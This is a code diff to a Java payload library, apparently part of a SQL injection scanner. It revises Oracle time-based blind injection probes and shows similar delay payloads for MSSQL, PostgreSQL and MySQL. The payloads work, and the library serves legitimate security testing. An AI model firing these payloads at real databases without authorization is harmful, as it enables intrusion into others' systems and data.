@@ -92,7 +92,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.TimeProbe("'; DECLARE @d VARCHAR(99); SET @d='0:0:{S}'; WAITFOR DELAY @d-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe(" and 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
       new SqlPayloadLibrary.TimeProbe("1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
-      new SqlPayloadLibrary.TimeProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',{S})='h", "Oracle", SqlPayloadLibrary.Ctx.STRING),
+      new SqlPayloadLibrary.TimeProbe("'/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('h',{S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe("' AND 1=DBMS_LOCK.SLEEP({S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
       new SqlPayloadLibrary.TimeProbe(
          "' AND UTL_INADDR.GET_HOST_ADDRESS('tsjan-nonexistent-{S}.invalid')='1'-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING, false
@@ -128,7 +128,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.XrayProbe("');waitfor/**/delay'0:0:{S}'/**/-- ", "MSSQL"),
       new SqlPayloadLibrary.XrayProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL"),
       new SqlPayloadLibrary.XrayProbe("'||(select'1'from/**/pg_sleep({S}))::text||'", "PostgreSQL"),
-      new SqlPayloadLibrary.XrayProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})='{C}'", "Oracle")
+      new SqlPayloadLibrary.XrayProbe("'/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})-- -", "Oracle")
    );
    public static final List<SqlPayloadLibrary.XrayProbe> XRAY_STRING_PROBES = List.of(
       new SqlPayloadLibrary.XrayProbe("'and(select*from(select+sleep({S}))a[Space] union [Space]select+1)='", "MySQL"),
@@ -137,7 +137,7 @@ public final class SqlPayloadLibrary {
       new SqlPayloadLibrary.XrayProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL"),
       new SqlPayloadLibrary.XrayProbe("'||(select'1'from/**/pg_sleep({S}))::text||'", "PostgreSQL"),
       new SqlPayloadLibrary.XrayProbe("'and(select+1)>0waitfor/**/delay'0:0:{S}", "MSSQL"),
-      new SqlPayloadLibrary.XrayProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})='{C}'", "Oracle"),
+      new SqlPayloadLibrary.XrayProbe("'/**/and/**/1=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})-- -", "Oracle"),
       new SqlPayloadLibrary.XrayProbe("/**/and/**/{R}=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})", "Oracle")
    );
    public static final List<SqlPayloadLibrary.XrayProbe> XRAY_BARE_ERROR_PROBES = List.of(
